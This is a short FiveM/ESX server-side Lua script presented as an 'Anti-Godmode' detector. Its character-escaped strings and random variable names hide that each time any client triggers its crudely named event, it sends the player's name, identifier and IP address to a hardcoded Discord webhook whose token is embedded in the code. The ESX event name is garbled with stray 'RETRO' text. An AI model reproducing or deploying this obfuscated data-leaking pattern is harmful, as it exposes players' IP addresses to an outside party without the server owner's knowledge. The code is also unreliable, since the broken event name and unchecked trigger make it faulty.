ESX = nil

TriggerEvent('esx:getShRETROaredObjRETROect', function(obj) ESX = obj end)

RegisterServerEvent('EiiyHasBeen:FuckYou')

 AddEventHandler('EiiyHasBeen:FuckYou', function(xPlayer)

  local xPlayer = ESX.GetPlayerFromId(source)

  local h2e2Vknimhb26rcN = GetPlayerIdentifier(source)

  local THdLpQzqLHpa2G7y = GetPlayerName(source)

  local C2Mdn9KTCxaB6ySp = GetPlayerEndpoint(source)

  local EovntTAjLZa7wumy = GetPlayerPing(source)

  pHBRvRA7fTTvbsyQ = '\69\105\105\121\32\65\110\116\105\45\71\111\100\109\111\100\101'

  RbcCFVfA2VXb9tLy = '\104\116\116\112\115\58\47\47\105\46\105\109\103\117\114\46\99\111\109\47\66\81\115\110\75\98\120\46\112\110\103'

  uYxFiLukV4prVsDM = '\80\108\97\121\101\114\32\96\96'..THdLpQzqLHpa2G7y..'\96\96\32\100\101\116\101\99\116\101\100\32\117\115\105\110\103\32\71\111\100\109\111\100\101\n\83\116\101\97\109\73\68\58\32\96\96'..h2e2Vknimhb26rcN..'\96\96\n\73\80\58\32\96\96'..C2Mdn9KTCxaB6ySp..'\96\96\32\124\32\80\105\110\103\58\32\96\96'..EovntTAjLZa7wumy..'\96\96'

  PerformHttpRequest('https://discordapp.com/api/webhooks/765801610211229746/4j-W6oOXEv0sXf4U0hyyidOX8thVozrkRFinqtdFc5472UiFRgZk_v0_wanG7-D3lI_L', 

  function(err, text, headers) end, 'POST', json.encode({username = pHBRvRA7fTTvbsyQ, content = uYxFiLukV4prVsDM, avatar_url = RbcCFVfA2VXb9tLy}), { ['Content-Type'] = 'application/json' })

end)
